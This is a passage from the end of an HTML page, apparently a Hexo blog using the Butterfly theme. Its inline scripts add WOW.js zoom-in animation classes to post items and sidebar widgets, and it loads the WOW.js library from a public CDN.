--><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '2s');
+    arr[i].setAttribute('data-wow-delay', '1s');
+    arr[i].setAttribute('data-wow-offset', '100');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><!-- hexo injector body_end end --></body></html>
